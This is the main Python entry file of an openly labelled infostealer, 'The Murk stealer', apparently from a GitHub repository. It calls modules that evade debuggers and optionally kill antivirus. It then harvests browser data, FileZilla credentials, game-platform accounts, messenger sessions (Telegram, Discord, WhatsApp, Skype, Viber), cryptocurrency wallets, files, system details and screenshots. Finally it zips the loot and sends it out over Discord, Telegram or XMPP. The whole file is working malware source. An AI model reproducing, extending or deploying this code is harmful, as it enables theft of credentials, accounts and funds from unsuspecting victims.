#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from manager import make_folder
from system import system_info
from system import programs
from system import photos
from games import Minecraft
from messengers import telegram
from manager import send 
from manager import clear
from games import steam
from messengers import discord
from games import epicGames
from messengers import whatsapp
from games import roblox
from wallets import wallets
from messengers import skype
from games import BattleNET
from games import Uplay
from config import config
from manager import ending
from messengers import viber
from browsers import browsers
from files import Files_txt
from files import file_grubber
from secure import antiDebug
from files import filezilla

def Start() -> None:
    if not config.Config.debuging:
        antiDebug.AntiDebug(config.Config.oneStart,config.Config.avKiller)
    make_folder.makeFolders(config.Config.enableFileGrubber,config.Config.oneStart)
def GrubFiles() -> None:
    if config.Config.enableFileGrubber:
        config.Config.dataForMassageFiles= file_grubber.Grab(config.Config.dataForMassageFiles)
    else:
        Files_txt.TxtSteal()
    filezilla.FileZilla()

def Browsers() -> None:
    browsers.Browsers()
    config.Config.dataForMassageBrowsers = browsers.Browsers.Return()

def Games() -> None:
    config.Config.dataForMassageOther = epicGames.Epic(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = Uplay.Ubisoft(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = Minecraft.Minecraft(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = roblox.roblox(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = steam.Steam(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther =BattleNET.BattleNet(config.Config.dataForMassageOther)

def Messagers() -> None:
    config.Config.dataForMassageOther = skype.skype(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = telegram.Telegram(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = viber.Viber(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = discord.Discord(config.Config.dataForMassageOther)
    config.Config.dataForMassageOther = whatsapp.WhatsApp(config.Config.dataForMassageOther)

def System() -> None:
    config.Config.dataForMassageSYS = system_info.SystemInfo(config.Config.dataForMassageSYS)

def Other() -> None:
    config.Config.dataForMassageWallets = wallets.Wallets(config.Config.dataForMassageWallets)
    programs.Programs()
    photos.Screenshot()

def End() -> None:
    try:
        config.Config.np = clear.makemeZip(config.Config.name,config.Config.password,config.Config.np)
    except Exception as e:
        print(e)
    try:
        send.Send(config.Config.sendType,config.Config.np,config.Config.dataForMassageSYS,config.Config.dataForMassageBrowsers,config.Config.dataForMassageOther,config.Config.dataForMassageWallets,config.Config.dataForMassageFiles,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
    except Exception as e:
        print(e)
    ending.End(config.Config.np)

def Main()-> None:
    Start()
    GrubFiles()
    Browsers()
    Games()
    Messagers()
    System()
    Other()
    End()

